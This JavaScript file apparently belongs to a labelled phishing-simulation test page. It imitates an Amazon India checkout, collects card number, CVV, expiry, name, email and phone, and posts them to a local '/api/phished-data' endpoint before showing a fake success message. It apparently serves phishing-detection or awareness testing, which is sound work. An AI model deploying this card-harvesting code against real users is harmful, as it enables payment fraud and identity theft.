// 🚨 This site is a TEST phishing simulation for Verdict
// DO NOT enter real payment details

document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('payment-form');
    const cardNumber = document.getElementById('card-number');
    const expiry = document.getElementById('expiry');
    const cvv = document.getElementById('cvv');
    const name = document.getElementById('name');
    const email = document.getElementById('email');
    const phone = document.getElementById('phone');
    const payButton = form.querySelector('.pay-button');

    // Format card number with spaces
    cardNumber.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, '');
        if (value.length > 16) value = value.slice(0, 16);
        const formatted = value.replace(/(.{4})/g, '$1 ').trim();
        e.target.value = formatted;
    });

    // Format expiry
    expiry.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.slice(0, 2) + '/' + value.slice(2);
        }
        if (value.length > 5) value = value.slice(0, 5);
        e.target.value = value;
    });

    // Limit CVV
    cvv.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
    });

    // 🚨 PHISHING: Form submit - send data to backend analysis
    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        // Collect all data
        const paymentData = {
            cardNumber: cardNumber.value.replace(/\s/g, ''),
            expiry: expiry.value,
            cvv: cvv.value,
            name: name.value,
            email: email.value,
            phone: phone.value,
            amount: '2499.00',
            merchant: 'Amazon India Pvt Ltd',
            orderId: 'ORD-2026-08-31-XXXX',
            timestamp: new Date().toISOString(),
        };

        // Log the attempt
        console.log('🚨 PHISHING ATTEMPT DETECTED - DATA CAPTURED:');
        console.log('📱 Full Data:', paymentData);

        // Send data to backend for storage & analysis
        try {
            const response = await fetch('http://localhost:8000/api/phished-data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(paymentData)
            });

            const result = await response.json();
            console.log('📡 Response from backend:', result);

            if (result.success) {
                // Show fake success modal
                document.getElementById('user-email').textContent = paymentData.email;
                document.getElementById('success-modal').style.display = 'flex';
                
                // Reset form
                form.reset();
            } else {
                alert('Error processing payment. Please try again.');
            }
        } catch (error) {
            console.error('❌ Error sending data to backend:', error);
            alert('Network error. Payment simulation failed.');
        }
    });

    // Close modal function
    window.closeModal = function() {
        document.getElementById('success-modal').style.display = 'none';
    };
});

// ⚠️ Initialize backend connection check
console.log('📡 Phishing test page loaded - backend API endpoint: http://localhost:8000/api/phished-data');